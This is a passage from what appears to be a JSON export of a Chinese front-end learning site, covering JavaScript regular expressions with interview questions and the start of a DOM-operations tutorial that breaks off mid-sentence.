匹配除xyz之外的任何字符\nconsole.log(reg.test('xyz'));  //false\n```\n\n## 3.边界符\n\n> ^ 匹配输入开始。表示匹配行首的文本（以谁开始)。如果多行（multiline）标志被设为 true，该字符也会匹配一个断行（line break）符后的开始处。\n\n> $ 匹配输入结尾。表示匹配行尾的文本（以谁结束）。如果多行（multiline）标志被设为 true，该字符也会匹配一个断行（line break）符的前的结尾处。\n\n> 如果 ^和 $ 在一起，表示必须是精确匹配。\n\n```js\nvar rg = /abc/; \n// /abc/ 只要包含有abc这个字符串返回的都是true\nconsole.log(rg.test('abc'));  //true\nconsole.log(rg.test('abcd')); //true\nconsole.log(rg.test('aabcd'));//true\nconsole.log('---------------------------');\n// 必须是以abc开头的字符串才会满足\nvar reg = /^abc/;\nconsole.log(reg.test('abc')); // true\nconsole.log(reg.test('abcd')); // true\nconsole.log(reg.test('aabcd')); // false\nconsole.log('---------------------------');\n// 必须是以abc结尾的字符串才会满足\nvar reg = /abc$/;\nconsole.log(reg.test('abc')); // true\nconsole.log(reg.test('qweabc')); // true\nconsole.log(reg.test('aabcd')); // false\nconsole.log('---------------------------');\nvar reg1 = /^abc$/; // 精确匹配 要求必须是 abc字符串才符合规范\nconsole.log(reg1.test('abc')); // true\nconsole.log(reg1.test('abcd')); // false\nconsole.log(reg1.test('aabcd')); // false\nconsole.log(reg1.test('abcabc')); // false\n```\n\n## 4.字符集与边界符一起使用\n\n```js\n//// 三选一 只有是a 或者是 b  或者是c 这三个字母才返回 true\nvar reg = /^[abc]$/;\nconsole.log(reg.test('a')); //true\nconsole.log(reg.test('b')); //true\nconsole.log(reg.test('c')); //true\nconsole.log(reg.test('aa')); //false\n\n// 26个英文字母(大写和小写都可以)任何一个字母返回 true\nvar reg = /^[0-9A-Za-z]$/;\nconsole.log(reg.test('a')); //true\nconsole.log(reg.test('A')); //true\nconsole.log(reg.test('2')); //true\nconsole.log(reg.test('!')); //false\n\nvar reg = /^[^0-9A-Za-z]$/; //^反义字符 只要包含方括号内的字符，都返回 false\nconsole.log(reg.test('a')); //false\nconsole.log(reg.test('A')); //false\nconsole.log(reg.test('2')); //false\nconsole.log(reg.test('!')); //true\n```\n\n## 5.零宽单词和非零宽单词的边界\n\n> \\\\b 零宽单词边界 单词和空格之间位置 （取一个完整单词）\n> \n> \\\\B单词边界和单词边界中间的位置 不匹配单词边界 （取某个单词中间部分）\n\n```js\nvar  str = 'hello world javascript';\n\nvar reg = /\\brld\\b/;\nconsole.log(reg.exec(str)); //null\n\nvar reg = /\\bhello\\b/;\nconsole.log(reg.exec(str)); \n//[\n    //'hello',\n    //index: 0,\n    //input: 'hello world javascript',\n    //groups: undefined\n//]\n\n\nvar reg = /\\Brld\\B/;\nconsole.log(reg.exec(str)); //null\n\nvar reg = /\\Borl\\B/;\nconsole.log(reg.exec(str)); //[ 'orl', index: 7, input: 'hello world javascript', groups: undefined ]\n```\n\n## 6.字符类\n\n> 将直接量字符单独放进方括号内就组成了字符类，一个字符类可以匹配它所包含的任意字符。\n\n| 字符类 | 含义 |\n| --- | --- |\n| . | 匹配除换行符\\\\n和回车符之外的任何单个字符，等效于 **\\[^\\\\n\\\\r\\]** |\n| \\\\d | 匹配一个数字字符，等效于\\[0-9\\] |\n| \\\\D | \\[^0-9\\] |\n| \\\\w | 匹配包括下划线的任何单个字符，包括A~Z，a~z，0~9和下划线 **\"\\_\"** ，等效于 \\[a-zA-Z0-9\\_\\] |\n| \\\\W | \\[^a-zA-Z0-9\\_\\] |\n| \\\\s | 匹配任何Unicode空白字符，包括空格、制表符、换页符等，等效于\\[\\\\f\\\\t\\\\n\\\\r\\] |\n| \\\\S | \\[^\\\\f\\\\t\\\\n\\\\r\\] |\n\n> 记忆： d ==> digit（数字） s ==> space（空白） w ==> word（单词）\n\n```js\nvar reg = /./; //匹配除\\n\\r 之外的任意字符\nvar str = '\\nhello\\r world js'; \nconsole.log(reg.test(str)); //true\n\nvar str = '\\n\\r '; \nconsole.log(reg.test(str)); //true\n\nvar str = '\\n\\r'; \nconsole.log(reg.test(str)); //false\n\nvar reg = /\\d/; //\\d 等同于[0-9] 匹配任意数字\nconsole.log(reg.test('12'));\nconsole.log(reg.test('0'));\nconsole.log(reg.test('1a'));\nconsole.log(reg.test('a')); //false\n\nvar reg = /\\D/; //\\D等同于[0-9] 不匹配数字\nconsole.log(reg.test('1')); //false\nconsole.log(reg.test('a'));\nconsole.log(reg.test('!'));\nconsole.log(reg.test(' '));\n\nvar reg = /\\w/; //\\w 匹配[0-9A-Za-z_]\nconsole.log(reg.test('a'));\nconsole.log(reg.test('A'));\nconsole.log(reg.test('_'));\nconsole.log(reg.test('1'));\nconsole.log(reg.test('!')); //false\nconsole.log(reg.test(' ')); //false\n\nvar reg = /\\W/; //\\W 匹配[^0-9A-Za-z_]\nconsole.log(reg.test('0'));\nconsole.log(reg.test('a'));\nconsole.log(reg.test('_'));\nconsole.log(reg.test('@')); //true\nconsole.log(reg.test(' ')); //true\n\nvar reg = /\\s/; //\\s 匹配任何unicode空白符 空格 制表符 换行符 [\\f\\n\\t\\r]\nconsole.log(reg.test(' '));\nconsole.log(reg.test('\\n'));\nconsole.log(reg.test('a')); //false\nconsole.log(reg.test('1')); //false\n\nvar reg = /\\S/; //\\S 等效于 [^\\f\\t\\n\\r]\nconsole.log(reg.test('1'));\nconsole.log(reg.test('a'));\nconsole.log(reg.test('!')); \nconsole.log(reg.test(' ')); //false \nconsole.log(reg.test('\\n')); //false\n```\n\n# 数量词\n\n| 字符 | 含义 |\n| --- | --- |\n| \\* | \\>=0次 |\n| + | ≥1 次 |\n| ？ | 0或1次 |\n| {n} | n 次 |\n| {n,} | ≥n 次 |\n| {n,m} | n到m 次 |\n\n```js\nvar reg = /^a*$/; // * 允许出现0次或多次\nconsole.log(reg.test(\"\")); //true\nconsole.log(reg.test(\"a\")); //true\nconsole.log(reg.test(\"aa\")); //true\n\nvar reg = /^a+$/; // + 允许出现1次或多次\nconsole.log(reg.test(\"\")); //false\nconsole.log(reg.test(\"a\")); //true\nconsole.log(reg.test(\"aa\")); //true\n\nvar reg = /^a?$/; // ? 只允许a出现1次或0次\nconsole.log(reg.test(\"\")); //true\nconsole.log(reg.test(\"a\")); //true\nconsole.log(reg.test(\"aa\")); //flase\nconsole.log(reg.test(\"aaa\")); //false\n\nvar reg = /^a{3}$/; // {3} 允许重复3次\nconsole.log(reg.test(\"aaa\")); //true\nconsole.log(reg.test(\"aaaa\")); //false\nconsole.log(reg.test(\"a\")); //false\n\nvar reg = /^a{3,6}$/; // {3,6} 允许重复出现3次-6次之间，也就是>=3且<=6\nconsole.log(reg.test('aa')); //false\nconsole.log(reg.test('aaa'));\nconsole.log(reg.test('aaaa'));\nconsole.log(reg.test('aaaaa'));\nconsole.log(reg.test('aaaaaa'));\nconsole.log(reg.test('aaaaaaa')); //false\n\nvar reg = /^a{3,}$/;  // {3,} 允许重复出现3次或3次以上多次\nconsole.log(reg.test('aa')); //false\nconsole.log(reg.test('aaa'));\nconsole.log(reg.test('aaaa'));\nconsole.log(reg.test('aaaaa'));\nconsole.log(reg.test('aaaaaa'));\nconsole.log(reg.test('aaaaaaa'));\nconsole.log(reg.test('aaaaaaaa'));\nconsole.log(reg.test('aaaaaaaaaaaaaaaaaa'));\n\n//案例\n//匹配qq号:不能以数字0开始，只能由数字组成，长度为5-11位\nvar reg = /^[1-9]\\d{4,10}$/;\nconsole.log(reg.test(\"1112\")); //false\nconsole.log(reg.test(\"1440549324\"));\n\n//匹配身份证号：18位 不能以数字0开头，只能由数字组成，最后一位可能是x，X，数字\nvar reg = /^[1-9]\\d{16}[xX\\d]$/;\nconsole.log(reg.test('142325202006283320'));\nconsole.log(reg.test('14232520200628332x'));\nconsole.log(reg.test('1423252020062833')); //false \nconsole.log(reg.test('1423252020062833xx')); //false\n```\n\n## 贪婪模式和非贪婪模式\n\n> 贪婪模式：尽可能多的匹配（首先取最多可匹配的数量为一组进行匹配），当匹配剩余的字符串，还会继续尝试新的匹配，直到匹配不到为止，为默认模式。\n> \n> 非贪婪模式：尽可能少的匹配（每次取最少匹配的数量为一组进行匹配），直到匹配不到为止 (使用方法：在量词后加上?)\n\n```js\n//贪婪模式\nvar reg = /\\d{3,6}/g;\nvar str = \"12345678\";\nconsole.log(reg.exec(str)); //[ '123456', index: 0, input: '12345678', groups: undefined ]\nconsole.log(reg.exec(str)); //null\n\n//非贪婪模式\nvar reg = /\\d{3,6}?/g;\nvar str = \"123456789\";\nconsole.log(reg.exec(str)); //[ '123', index: 0, input: '123456789', groups: undefined ]\nconsole.log(reg.exec(str)); //[ '456', index: 3, input: '123456789', groups: undefined ]\nconsole.log(reg.exec(str)); //[ '789', index: 6, input: '123456789', groups: undefined ]\nconsole.log(reg.exec(str)); //null\nconsole.log(reg.exec(str)); //[ '123', index: 0, input: '123456789', groups: undefined ]\n```\n\n# 选择，分组，候选\n\n## 选择\n\n> 字符\"|\"用于分隔供选择的字符，选择项的尝试匹配次序是从左到右，直到发现了匹配项，如果左边的选择项匹配，就忽略右边的匹配项，即使它可以产生更好的匹配。\n\n```js\nvar reg = /html|css|js/g;\nvar str = 'helloworldcsshtml'\nconsole.log(reg.exec(str)); //[ 'css', index: 10, input: 'helloworldcsshtml', groups: undefined ]\nconsole.log(reg.exec(str)); //[ 'html', index: 13, input: 'helloworldcsshtml', groups: undefined ]\n```\n\n## 分组\n\n> 有圆括号包裹的一个小整体成为分组\n\n```js\nvar reg = /briupbriupbriup/;\nconsole.log(reg.test('briup')); //false\nconsole.log(reg.test('briupbriup')); //false\nconsole.log(reg.test('briupbriupbriup'));\nconsole.log(reg.test('briupbriupbriupbriup'));\n\nvar reg = /^(briup){3}$/;\nconsole.log(reg.test('briup')); //false \nconsole.log(reg.test('briupbriup')); //false\nconsole.log(reg.test('briupbriupbriup')); //true\nconsole.log(reg.test('briupbriupbriupbriup')); //false\n```\n\n## 候选\n\n> 选择分组综合\n\n```js\nvar reg = /I like (html|css|js)/;\nconsole.log(reg.test('I like html'));\nconsole.log(reg.test('I like css'));\nconsole.log(reg.test('I like js'));\nconsole.log(reg.test('I like table')); //false\n```\n\n## 捕获和引用\n\n> 被正则表达式匹配（捕获）到的字符串会被暂存起来。其中，由分组捕获的串会从1开始编号，于是我们可以引用这些串\n\n```js\nvar reg = /(\\d{4})-(\\d{2})-(\\d{2})/;\nvar str = '2023-06-28';\nreg.exec(str);\nconsole.log(RegExp.$1); //2023\nconsole.log(RegExp.$2); //06\nconsole.log(RegExp.$3); //28\n```\n\n> 嵌套分组的捕获 : 规则是以左括号出现的顺序进行捕获\n\n```js\nvar reg = /((apple) is (a (fruit)))/;\nreg.exec('apple is a fruit');\nconsole.log(RegExp.$1); //apple is a fruit\nconsole.log(RegExp.$2); //apple \nconsole.log(RegExp.$3); //a fruit\nconsole.log(RegExp.$4); //fruit\n```\n\n> 引用： 正则表达式里也能进行引用，这称为反向引用\n\n```js\nvar reg = /(\\w{3}) is \\1/\nconsole.log(reg.test('kid is kid')); // true\nconsole.log(reg.test('dik is dik')); // true\nconsole.log(reg.test('kid is dik')); // false\nconsole.log(reg.test('dik is kid')); // false\n//\\1引用了第一个被分组所捕获的串，换言之，表达式是动态决定的。\n\n//注意，如果编号越界了，则会被当成普通的表达式：\nvar reg = /(\\w{3}) is \\6/;\nreg.test( 'kid is kid' ); // false\nreg.test( 'kid is \\6' );  // true\n```\n\n# String对正则表达式的支持\n\n## search\n\n> 查找字符串中是否有匹配正则的字符串，有则返回字符串**第一次出现时的位置**，无则返回**null**\n> \n> 正则中无论是否有全局匹配都不会影响返回结果\n\n```js\nvar str = 'hello world hello';\nvar reg = /hello/;\nvar reg2 = /hello/g;\nconsole.log(str.search(reg)); //返回 0\nconsole.log(str.search(reg2));//返回 0\n```\n\n## match\n\n> 字符串匹配符合正则表达式字符串 匹配到返回数组，并返回该字符串的一个**数组**，其中包括字符串**内容**、**位置**\n> \n> 如果正则设置全局匹配，则**一次性返回所有**符合正则表达式的字符串数组\n> \n> 如果其中添加了分组，返回符合要求的字符串以及**分组**的一个数组，但如果同时开启全局匹配则**不会在数组中添加分组内容**\n\n```js\nvar str = 'hello world hello';\nvar reg1 = /hello/;\nvar reg2 = /hello/g;\nvar reg3 = /(he)llo/;\nvar reg4 = /(he)llo/g;\n// 匹配字符串中符合正则表达式的字符串，并返回该字符串的一个数组，其中包括字符串内容、位置\n// [ 'hello', index: 0, input: 'hello world hello', groups: undefined ]\nconsole.log(str.match(reg1));\n// 如果正则设置全局匹配，则一次性返回所有符合正则表达式的字符串数组\n// [ 'hello', 'hello' ]\nconsole.log(str.match(reg2));\n// 如果其中添加了分组，返回符合要求的字符串以及分组的一个数组\n// [\n//   'hello',\n//   'he',\n//   index: 0,\n//   input: 'hello world hello',\n//   groups: undefined\n// ]\nconsole.log(str.match(reg3));\n// 如果同时开启全局匹配则不会在数组中添加分组内容\n// [ 'hello', 'hello' ]\nconsole.log(str.match(reg4));\n```\n\n## split\n\n> 以某种形式分割字符串 将其转换为数组\n\n```js\nvar str = 'terry123larry456tony';\nvar reg = /\\d{3}/;\nconsole.log(str.split(reg)); //[ 'terry', 'larry', 'tony' ]\n```\n\n## replace\n\n> 满足正则表达式的内容会被替换\n\n```js\nvar str = 'javascript';\nvar reg = /javascript/;\nvar res = str.replace(reg,'java');\nconsole.log(res,str,reg); //java javascript /javascript/\n```\n\n# 前瞻表达式\n\n| **表达式** | **名称** | **描述** |\n| --- | --- | --- |\n| (?=exp) | 正向前瞻 | 匹配后面满足表达式exp的位置 |\n| (?!exp) | 负向前瞻 | 匹配后面不满足表达式exp的位置 |\n\n```js\nvar str = 'Hello, Hi, I am Hilary.';\n// 后面一定要匹配什么\nvar reg = /H(?=i)/g;\nvar newStr = str.replace(reg, \"T\");\nconsole.log(newStr);//Hello, Ti, I am Tilary.\n```\n\n> 在这个DEMO中我们可以看出正向前瞻的作用，同样是字符\"H\"，但是只匹配\"H\"后面紧跟\"i\"的\"H\"。就相当于有一家公司reg，这时候有多名\"H\"人员前来应聘，但是reg公司提出了一个硬条件是必须掌握\"i\"这项技能，所以\"Hello\"就自然的被淘汰掉了。\n> \n> 那么负向前瞻呢？道理是相同的：\n\n```js\nvar str = 'Hello, Hi, I am Hilary.';\n// 后面一定不要匹配什么\nvar reg = /H(?!i)/g;\nvar newStr = str.replace(reg, \"T\");\nconsole.log(newStr);//Tello, Hi, I am Hilary.\n```\n\n> 在这个DEMO中，我们把之前的正向前瞻换成了负向前瞻。这个正则的意思就是，匹配\"H\",且后面不能跟着一个\"i\"。这时候\"Hello\"就可以成功的应聘了，因为reg公司修改了他们的招聘条件，他们说\"i\"这门技术会有损公司的企业文化，所以我们不要了。\n\n# 小练习\n\n## 1.验证是否为11位有效手机号码？\n\n> 以1为开头\n> \n> 第二位为3，4，5，7，8中的任意一位\n> \n> 最后以0-9的9个整数结尾\n\n```js\nvar reg = /^[1][34578]\\d{9}$/; \nconsole.log(reg.test('18412341225'));  //true\nconsole.log(reg.test('1100'));\nconsole.log(reg.test('12345678910'));\nconsole.log(reg.test('02345678910'));\n```\n\n## 2.密码验证\n\n> 匹配密码，必须包含大写，小写和数字,和特殊字符(!,@,#,%,&),且大于6位\n\n```js\nvar reg = /(?=.*[A-Z])(?=.*[a-z])(?=.*\\d)(?=.*[!@#%&])^[A-Za-z\\d!@#%&]{6,}$/;\nvar str = '1!1A3a';\nconsole.log(reg.test(str)); //true\n```",
    "testPoint": "### 1. **正则表达式的基本概念**\n   - 什么是正则表达式？它在 JavaScript 中的作用是什么？\n   - 正则表达式适用于哪些场景？请简要说明一些常见的应用场景。\n\n### 2. **正则表达式的语法**\n   - 请解释一些常用的正则表达式符号，例如 `.`、`*`、`+`、`?`、`^`、`$` 等。\n   - 你如何使用字符类和字符组？比如 `[a-z]`、`[0-9]`、`\\d`、`\\w` 等符号的含义是什么？\n\n### 3. **匹配的模式**\n   - 什么是贪婪匹配（Greedy Match）和懒惰匹配（Lazy Match）？如何切换这两种模式？\n   - 请解释如何使用正则表达式的边界匹配符，比如 `\\b` 和 `\\B`，以及它们在匹配单词边界中的应用。\n\n### 4. **分组和捕获**\n   - 什么是捕获组（Capturing Group）？如何在正则表达式中使用括号 `()` 创建捕获组？\n   - 你如何使用非捕获组 `(?: … )`？它在什么场景下有用？\n   - 正则表达式中的反向引用是什么？你能举例说明它的使用方法吗？\n\n### 5. **特殊符号与转义**\n   - 在正则表达式中，什么时候需要使用转义字符 `\\`？请举例说明。\n   - 如何匹配像 `.`、`*` 等元字符自身？需要做哪些处理？\n\n### 6. **常用方法**\n   - JavaScript 中常用的正则表达式方法有哪些？请简要说明 `test`、`exec`、`match`、`replace`、`split` 等方法的作用和区别。\n   - 请解释 `match` 和 `matchAll` 的区别，以及它们在什么场景下适用。\n\n### 7. **正则表达式的性能优化**\n   - 正则表达式可能会导致性能问题，特别是在处理大文本时。你会如何优化正则表达式的性能？\n   - 在正则表达式匹配中，使用懒惰模式（非贪婪）能否有效提高性能？为什么？\n\n### 8. **正则表达式的实际应用**\n   - 你在实际开发中是如何使用正则表达式的？可以举一个具体的例子说明吗？\n   - 常见的表单验证（如邮箱、电话号码、URL）正则表达式应该如何编写？请分享一个你常用的正则表达式模式。\n\n### 9. **正则表达式调试与测试**\n   - 你是否使用过正则表达式的调试工具？如何调试和测试复杂的正则表达式？\n   - 在调试正则表达式时，遇到匹配不正确的情况你通常如何排查问题？\n\n### 10. **正则表达式的局限性与替代方案**\n   - 在处理非常复杂的文本解析时，正则表达式可能不太适用。你遇到过这种情况吗？如何处理？\n   - 除了正则表达式，你是否使用过其他文本匹配或解析方法？这些方法的优缺点是什么？",
    "exerciseKeyList": "[\"8f4296bd-3a36-47d4-a13b-05b5b628c37e\",\"e3f52a7b-4c54-4b00-bd6c-b63f2b60421c\"]",
    "vipLimit": 0,
    "level": 1,
    "pointOrder": 22,
    "createAt": "2024-10-01T13:41:09.000Z",
    "updateAt": "2024-11-08T14:41:02.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "8f4296bd-3a36-47d4-a13b-05b5b628c37e",
        "title": "使用正则表达式实现以下需求：筛选出数组中只包含大小写字母的字符串，并将结果转换成大写\n",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-10-10T12:42:18.000Z",
        "updateAt": "2023-04-23T20:15:09.000Z"
      },
      {
        "exerciseKey": "e3f52a7b-4c54-4b00-bd6c-b63f2b60421c",
        "title": "正则表达式是什么，有哪些应用场景？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-03T13:56:15.000Z",
        "updateAt": "2024-08-10T17:04:33.000Z"
      }
    ]
  },
  "26": {
    "id": 26,
    "tagId": 10,
    "title": "DOM操作",
    "explanation": " ![](https://static.ecool.fun//article/3321e8f5-d0aa-41f6-880b-25208ddf547f.awebp)\n\n## 1、DOM基本概念\n\n### 1.1、DOM、DOM节点与DOM树\n\n-   **[DOM](https://developer.mozilla.org/zh-CN/docs/Glossary/DOM \"https://developer.mozilla.org/zh-CN/docs/Glossary/DOM\")**：(**D**ocument **O**bject **M**odel, 文档对象模型)是文档内容（HTML或XML）在编程语言上的抽象模型，它建模了文档的内容和结构，并提供给编程语言一套完整的操纵文档的API。\n\n> 本文面向HTML，不讨论XML等文档，下文中“文档===HTML”。\n\n-   **DOM节点**：简称节点（Node），是DOM模型的组成单元。HTML的基本单元是标签，节点**常常**与标签对应，但连续的文本内容也是一个**文本标签**。\n-   **DOM树**：DOM树是DOM结构的表示形式，DOM把文档的每个节点根据父子关系连接，形成DOM树。\n\n### 1.2、节点、节点类型和节点类\n\n-   **节点**：前面提过，节点是DOM树的组成单元。在JS看来，一个节点就是JS对象。下面用`node`表示任意的节点。\n    \n-   **[节点类型](https://developer.mozilla.org/zh-CN/docs/Web/API/Node/nodeType \"https://developer.mozilla.org/zh-CN/docs/Web/API/Node/nodeType\")**：并非所有的节点都是一样的，DOM规定文档中有12种节点类型，分别用常量`1 ~ 12`（有与之对应的常量名称`Node.XXX_NODE`）表示，可以通过`node.nodeType`属性获取节点的类型常量。\n    \n    现在，有些类型的节点已经弃用了，常见到的只有几种类型的节点，包括：\n    \n    -   **元素节点**: 类型常量为`Node.ELEMENT_NODE`或`1`。最常见的一类节点，对应文档中的元素。大部分DOM操作都是在元素节点层次的。\n        \n    -   **文本节点**：类型常量为`Node.TEXT_NODE`或`2`。对应文档中的文本，**任何文档内容都有对应的文本节点，即使空格和换行符**。\n        \n        > 空格和换行不会对页面内容产生影响，但它们确实以文本节点的形式存在于DOM树中。\n        \n    -   **Document节点**：类型常量为`Node.DOCUMENT_NODE`或`9`。它不对应文档的内容，而是作为文档的入口节点，每个文档都有且仅有一个入口，因为这种独特性，赋予一个特殊的变量名称`document`。\n        \n    -   **注释节点**：类型常量为`Node.COMMENT_NODE`或`8`。它对应文档中的注释标签，文档的注释内容也是可读取和修改的。\n        \n-   **节点类**：DOM内置许多节点类，类之间存在继承关系，形成一套节点类框架。每个节点对象都属于节点类，拥有该类和其父类的方法与属性，这使得操作节点十分简单。节点类框架的一部分大概如图：\n    \n    ![](https://static.ecool.fun//article/2971a431-2418-4c97-952d-1bf06c7f3f8b.awebp)\n    \n    这些节点上有丰富的属性和方法，是继承的结果，可以看到，一个HTML标签元素至少有四层的继承关系。\n    \n    以`<a>`标签为例，它属于`HTMLAnchorElement`类，获得了`a.target`，`a.download`等属性，接着继承了`HTMLElement`类上的`title`, `hidden`等属性和`click()`等方法，又从`Element`类继承了`tagName`, `className`等属性和`getAttribute()`, `setAttribute()`等方法，再从`Node`类继承了`nodeType`(前面说过的节点类型), `appenChild()`, `removeChild()`等方法，最后从`EventTarget`类中继承了事件相关的属性和方法。\n    \n\n> **不要混淆节点类型和节点类这两个概念**。前者是一个生活中的**类别**，后者是编程意义上的**类**。节点对象的`nodeType`属性表示了它的类型，而节点类是该节点的从属的类。因为`Dode`是一个抽象类，所以，如果知道了某个节点从属的类，我们就知道它的节点类型。\n\n> **区分节点与元素节点**。我们经常关心元素节点（简称元素），因为这是一类最常使用的节点，但是并非所有节点都是元素。\n\n### 1.3、探索DOM结构\n\n前面的说法太抽象了，让我们用实际的例子看看文档、DOM树与节点的关系。\n\n[Live DOM Viewer](http://software.hixie.ch/utilities/js/live-dom-viewer/?%3C!DOCTYPE%20html%3E%0A...# \"http://software.hixie.ch/utilities/js/live-dom-viewer/?%3C!DOCTYPE%20html%3E%0A...#\")是一个可以根据HTML文档实时查看DOM树的网站。你把下面的例子复制过去，或者自己去探索。\n\n一个简单的HTML文档：\n\n```html\n<!DOCTYPE HTML>\n<html>\n<body>\n  A simple text.\n  <ol title=\"this is a title\">\n    <li>czpcalm</li>\n    <!-- comment -->\n  </ol>\n</body>\n</html>\n```\n\n它对应的DOM图（颜色区分了节点类型）：\n\n![](https://static.ecool.fun//article/77c1860d-edc0-4f09-bf7f-9a814d7818dc.awebp)\n\n留意这个图，你要注意几点：\n\n-   总共有4种类型的节点，分别是`标签节点`（红色）,`文本节点`（灰色），`注释节点`(黄色)和`DOCTYPE节点`（紫色）。\n    \n-   文档没有`<head>`标签却出现了`HEAD`节点。这是因为HTML必然存在`<html>`，`<head>`，`<body>`标签，不存在时会自动补上。顺便一提，当出现`<table>`标签时，也一定会有`<tbody>`标签。\n    \n-   文档中的文本都会形成文本节点的内容，包括`空格␣`和`换行↵`。第一,`单独的空格和换行都会形成对应的文本节点`；第二，有内容的文本节点的值包含前导和后继的空白。\n    \n    > 不是说HTML中的空白字符都被忽略吗？怎么这里又说全都是有效的字符？\n    > \n    > 在从文档解析生成DOM树的过程中，HTML中的任何字符都是有效的；不过，在接下去的页面渲染的过程中，空白内容被忽略。所以从文档到页面的整过过程中，空白确实被忽略了。\n    \n-   理解DOM树中的父子关系对应文档中的包含（嵌套）关系。一个极佳的类比是文件树，把元素看做文件夹，文本看做文件，文件夹中可以存放文件和新的文件夹，然后一层层深入下去，DOM树也是如此。\n    \n\n几个原则可以帮我们快速理解这个DOM树的构建：\n\n-   `自动补全`, 上面提到的自动添加必要元素，另外，还会自动补齐缺少的关闭标签。\n-   文档有的DOM树都有。这个原则要求空白也会有。不过，作为补充的，`<head>`前面的空白会被忽略（历史原因）。\n-   `<body>`后如果有内容，会被移到`<body>`里面。\n\n## 2、导航与搜索\n\n操作节点前，先要找到节点。导航是从一个节点到另一个节点；搜索是从一个范围中选出满足条件的节点。\n\n### 2.1、节点导航\n\n`Node`的类规定了节点具有的许多属性，方便我们从某个节点中找到跟它相关的另外节点。\n\n顶级节点一般直接获取：\n\n-   `document` -- 入口节点。\n-   `document.documentElement` -- HTML节点。\n-   `document.head` -- head节点。\n-   `document.body` -- body节点。\n\n对`node`节点，有以下属性：\n\n-   `node.parentNode` -- 获取节点的父节点。\n    \n-   `node.previousSibling` -- 获取节点的上一个兄弟节点。\n    \n-   `node.nextSibling` -- 获取节点的下一个兄弟节点。\n    \n-   `node.childNodes` -- 获取节点的孩子节点`列表`。没有子节点返回空列表。\n    \n-   `node.firstChild`和`node.lastChild` -- 获取第一个和最后一个孩子节点，同`node.childNodes[0]`和`node.childNodes[node.childNodes.length-1]`。\n    \n\n> 助记：都是两个单词拼写的。\n\n![](https://static.ecool.fun//article/d639e7cc-3b31-4607-a530-c8565a699a96.awebp)\n\n**这些是属性，不是方法**。不要错误使用bode.childNodes()之类的。\n\n**以上导航是基于节点的**，包括元素节点、文本节点、注释等。如1.3中的例子，`document.body.firstChild`得到的是`A simple text`所在的文本节点。\n\n因为我们经常只关心元素节点，DOM也提供了一组纯元素的导航属性, 对元素`elem`或者节点`node`, 有：\n\n-   `node.parentElement` -- 父元素节点，该属性来自`Node`类。\n-   `elem.previousElementSibling` -- 上一个兄弟元素\n-   `elem.nextElementSibling` -- 下一个兄弟元素\n-   `elem.children` -- 孩子元素列表\n-   `elem.firstElementChild`和`elem.lastElementChild`，第一个和最后一个孩子元素节点\n\n> 助记：children特殊，其它都有Element，没有Node。\n\n> 解惑：`node.parentNode`与`node.parentElement`有区别吗？父节点不应该都是元素节点吗？一般情况下，二者等效，但`html.parentNode === document`, document不是元素节点。\n\n> 提醒：上面的导航属性都是只读属性。`elem.parentElement = anotherElem; 是错误的`。\n\n### 2.2、搜索节点（重点）\n\n经常地，我们总是直接从文档中找出满足某些条件的元素，从而获取到目标元素。\n\n#### 2.2.1、`document/element.getElementBy*()`系列\n\n`getElementBy*`系列方法你们肯定不陌生，但我想要提醒的是，注意我的写法`document/element.getElementBy*()`，表示这是两个不同的类上的方法（参看上面节点类）。\n\n首先，是两个来自`Document`类的方法：\n\n-   `document.getElementById(id)` : 根据id获取文档中的元素。\n-   `document.getElementsByName(name)`: 根据name获取文档中的元素。很少使用。\n\n其次，是`Document`类和`Element`类都具有的方法：\n\n-   `document/element.getElementsByTagName(tagName)`: 根据标签名称获取文档或某个元素内的元素。\n-   `document/element.getElementByClassName(className)`：根据类名获取文档或某个元素内的元素。\n\n> 注意：`没有element.getElementById(id)`。\n\n> 注意：不要忘记或多加了`s`。除了`document.getElementById()`，其它方法的返回结果都是一个集合，没有满足条件的元素则是空集合。\n\n#### 2.2.2、`document/element.querySelectorAll/querySelector()`\n\n现在，推荐使用一组更强大的搜索新方法, 它们支持CSS选择器：\n\n-   `document/element.querySelectorAll(CSSSelector)`：返回满足选择器的一组节点列表。\n-   `document/element.querySelector(CSSSelector)`: 返回第一个满足选择器的元素。\n\n> 补充：`elem.matches(selector)`可以检查某个元素是否与选择器匹配。\n\n#### 2.2.3、两组搜索方法的对比\n\n`querySelector*`源自Selectors API 规范，与CSS选择器结合，更加灵活，强大，[已被所有现代浏览器支持](https://caniuse.com/?search=querySelector \"https://caniuse.com/?search=querySelector\")。是现在比较推荐的做法。\n\n`getElementBy*()`源自DOM2标准，被认为是传统接口，老项目中广泛使用。或者需要兼容IE8之前使用。但是有较好的性能，现在仍然有人在用。\n\n> 补充：作为结果的集合。在以集合返回结果的时候，或者返回一个[`NodeList`](https://developer.mozilla.org/en-US/docs/Web/API/NodeList \"https://developer.mozilla.org/en-US/docs/Web/API/NodeList\")对象，或者返回一个[`HTMLCollection`](https://developer.mozilla.org/zh-CN/docs/Web/API/HTMLCollection \"https://developer.mozilla.org/zh-CN/docs/Web/API/HTMLCollection\")对象，一般来说，二者都是可迭代的类数组对象，可以通过下标范围或`for...of`遍历。\n> \n> 注意：大部分结果集，包括`getElementBy*`和`node.childNode`等，都是动态的，即使查询并保存，之后如果修改文档，该结果集也会随之变化。但`querySelectorAll()`返回的结果是静态的。\n\n### 2.2.4、特殊的搜索方法\n\n有一些特殊的元素搜索方法，就我所知有：\n\n-   `elem.closest(selector)` -- 在`elemd`的父元素上查找最近一个满足选择器的元素。\n-   `document.elementFromPoint(clientX,clientY)` -- 返回相对当前视口坐标嵌套最深的（最上方）的元素。\n\n## 3、节点操作\n\n这一节涉及对某个节点的操作，一般不会引起文档内容（DOM树）的变化。\n\n### 3.1、通用节点操作\n\n这些操作基于\\*\\*[Node](https://developer.mozilla.org/zh-CN/docs/Web/API/Node \"https://developer.mozilla.org/zh-CN/docs/Web/API/Node\")\\*\\*接口，对所有节点都是通用的。\n\n-   **判断节点类型**：`node.nodeType`或`node instanceof <NodeClass>`。两者都可以用于判断节点类型，当需要明确的节点类的时候，只能通过后者。\n    \n    ```js\n    node.nodeType === Node.ELEMENT_NODE; //或node.nodeType === 1;\n    node instanceof Element;       //与上面等效\n    node instanceof HTMLInputElement;   //判断是否是输入元素\n    ```\n    \n-   获取节点名称：`node.nodeName`，对于元素节点，返回对应的标签名称，如`audio`。对其它类型节点，返回#与节点类型字符串，如`#text`, 